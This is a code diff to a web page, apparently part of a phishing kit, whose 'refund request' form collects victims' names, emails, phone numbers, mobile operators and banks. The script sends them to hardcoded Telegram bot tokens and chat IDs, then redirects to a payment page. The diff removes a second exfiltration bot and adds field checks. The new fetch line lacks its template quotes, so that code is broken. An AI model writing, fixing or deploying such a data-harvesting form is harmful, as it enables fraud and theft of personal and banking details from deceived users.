@@ -208,64 +208,53 @@
 </footer>
 
     <script>
-        document.getElementById("remboursement-form").addEventListener("submit", async function(event) {
-    event.preventDefault();
+    document.getElementById("remboursement-form").addEventListener("submit", async function(event) {
+        event.preventDefault();
 
-    const nom = document.getElementById("nom").value;
-    const email = document.getElementById("mail").value;
-    const telephone = document.getElementById("telephone").value;
-    const operateur = document.getElementById("operateur").value;
-    const bank = document.getElementById("bank").value;
+        const nom = document.getElementById("nom").value;
+        const email = document.getElementById("email").value;
+        const telephone = document.getElementById("telephone").value;
+        const operateur = document.getElementById("operateur").value;
+        const bank = document.getElementById("bank").value;
 
-    // توكن البوت الأول
-    const token1 = "7631724461:AAGvOb7G_n2IO1qGwpJp-WaHgyBhREW1mfU";
-    const chatId1 = "5372119436";
+        // التحقق من القيم
+        if (!nom || !email || !telephone || !operateur || !bank) {
+            alert("Veuillez remplir tous les champs avant de soumettre le formulaire.");
+            return;
+        }
 
-    // توكن البوت الثاني
-    const token2 = "7564050075:AAGScl7G7z2xf7Gh2lD8Isn4Dl33U-Eu_5k";
-    const chatId2 = "5372119436";
+        const token1 = "7631724461:AAGvOb7G_n2IO1qGwpJp-WaHgyBhREW1mfU";
+        const chatId1 = "5372119436";
 
-    const message = `
-🔔 **Nouvelle Demande de Remboursement** 🔔
-👤 Nom: ${nom}
-🔔 mail: ${mail}
-📞 Téléphone: ${telephone}
-📡 Opérateur: ${operateur}
-🏦 Banque: ${bank}`;
+        const message = `
+🔔 *Nouvelle Demande de Remboursement* 🔔
+👤 *Nom complet:* ${nom}
+📧 *Email:* ${email}
+📞 *Téléphone:* ${telephone}
+📡 *Opérateur:* ${operateur}
+🏦 *Banque:* ${bank}
+        `;
 
-    try {
-        // إرسال الطلب إلى البوت الأول
-        await fetch(`https://api.telegram.org/bot${token1}/sendMessage`, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json",
-            },
-            body: JSON.stringify({
-                chat_id: chatId1,
-                text: message,
-                parse_mode: "Markdown",
-            }),
-        });
+        try {
+            // إرسال الطلب إلى البوت
+            await fetch(https://api.telegram.org/bot${token1}/sendMessage, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                    chat_id: chatId1,
+                    text: message,
+                    parse_mode: "Markdown",
+                }),
+            });
 
-        // إرسال الطلب إلى البوت الثاني
-        await fetch(`https://api.telegram.org/bot${token2}/sendMessage`, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json",
-            },
-            body: JSON.stringify({
-                chat_id: chatId2,
-                text: message,
-                parse_mode: "Markdown",
-            }),
-        });
-
-        // إعادة التوجيه بعد الإرسال
-        window.location.href = "page-payement.html";
-    } catch (error) {
-        alert("Impossible d'envoyer les données. Vérifiez votre connexion.");
-    }
-});
-    </script>
+            // إعادة التوجيه بعد الإرسال
+            window.location.href = "page-payement.html";
+        } catch (error) {
+            alert("Impossible d'envoyer les données. Vérifiez votre connexion.");
+        }
+    });
+</script>
 </body>
 </html>
